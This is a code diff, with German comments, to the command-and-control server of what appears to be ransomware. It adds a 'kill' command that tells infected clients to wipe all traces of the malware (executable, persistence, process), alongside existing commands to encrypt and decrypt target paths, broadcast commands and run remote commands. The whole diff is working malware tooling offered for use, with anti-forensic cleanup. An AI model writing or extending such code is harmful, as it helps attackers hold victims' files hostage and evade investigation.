@@ -151,6 +151,29 @@ def send_command_to_client(cid: int, command: str) -> None:
             print(f"{Colors.WARNING}[!] Client ID {cid} nicht gefunden{Colors.ENDC}")
 
 
+def kill_client(cid: int) -> None:
+    """
+    Sendet einen kill Befehl, der sämtliche Spuren der Malware auf dem Client löscht
+
+    Löscht wird: Executable, Persistenz, Prozess
+
+    Args:
+        cid (int): Die eindeutige ID des Ziel-Clients (Client-ID)
+
+    Returns:
+        None
+    """
+    with lock:
+        if cid in clients:
+            try:
+                clients[cid].send("kill".encode("utf-8"))
+                print(f"[+] Kill-Befehl an ID {cid} gesendet")
+            except Exception as e:
+                print(
+                    f"{Colors.FAIL}[!] Fehler beim senden des Kill-Befehl an {cid}: {e}{Colors.ENDC}"
+                )
+
+
 def encrypt_target(cid: int, target_path: str) -> None:
     """
     Konstruiert und sendet den Verschlüsselungsbefehl für einen bestimmten Pfad.
@@ -293,6 +316,9 @@ def server_shell():
                                 f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}"
                             )
 
+                        elif sub_cmd.startswith("kill"):
+                            kill_client(cid)
+
                         elif sub_cmd:
                             send_command_to_client(cid, sub_cmd)
                 else:
@@ -312,6 +338,22 @@ def server_shell():
                     encrypt_target(cid, target_path)
             except ValueError:
                 print("[!] Client ID muss eine Zahl sein")
+            except Exception as e:
+                print(f"[!] Error: {e}")
+
+        elif cmd.startswith("kill "):
+            # Kill Befehl an einen angegebenen Client
+            try:
+                parts = cmd.split(" ", 2)
+                if len(parts) != 2:
+                    print("[!] Usage: kill <client_id>")
+                else:
+                    cid = int(parts[1])
+                    kill_client(cid)
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
+            except Exception as e:
+                print(f"[!] Error: {e}")
 
         elif cmd.startswith("decrypt "):
             try:
@@ -387,6 +429,9 @@ def server_shell():
             )
             print(
                 "  decrypt <id> [path]         - Entschlüssle Dateien auf spezifischem Client"
+            )
+            print(
+                "  kill <cid>                   - Sendet einen Kill-Befehl an einen spezifischen Client"
             )
             print("  broadcast <cmd>             - Sende Befehl an alle Clients")
             print("  exit                        - Server beenden")
